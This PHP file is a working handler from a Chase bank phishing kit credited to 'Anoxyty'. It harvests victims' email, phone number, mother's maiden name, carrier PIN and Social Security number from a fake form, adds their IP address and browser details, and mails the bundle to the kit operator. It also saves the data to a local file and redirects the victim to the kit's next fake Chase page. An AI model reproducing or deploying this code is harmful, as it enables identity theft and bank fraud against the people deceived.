<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include '../data.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];		
	if (hash_equals($_SESSION['token'], $_POST['token'])) {
		
		$_SESSION['email'] 	  = $_POST['email'];
	    $_SESSION['phone'] 	  = $_POST['phone'];
		$_SESSION['mmn'] 	  = $_POST['mmn'];
		$_SESSION['cpin'] 	  = $_POST['cpin'];
		$_SESSION['cType'] 	  = $_POST['cType'];
		$_SESSION['ssn'] 	  = $_POST['ssn'];
		
		$code = <<<EOT
============== [ CHASE By Anoxyty | ]🔥 ==============

[EMAIL ADDRESS] 		: {$_SESSION['email']}
[PHONE NUMBER]		: {$_SESSION['phone']}
[CARRIER PIN] 		: {$_SESSION['cpin']}
[CARRIER TYPE] 		: {$_SESSION['cType']}
[SOCIAL SECURITY/ITIN] 		: {$_SESSION['ssn']}
[MMN] 		: {$_SESSION['mmn']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 CHASE By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 CHASE Contact info By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($data,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ../email_identity?web/auth/#/logon/recognizeUser/mfacontacts_identification");
        exit();
	} else {
		header("Location: ../404?");
		exit();
	}
?>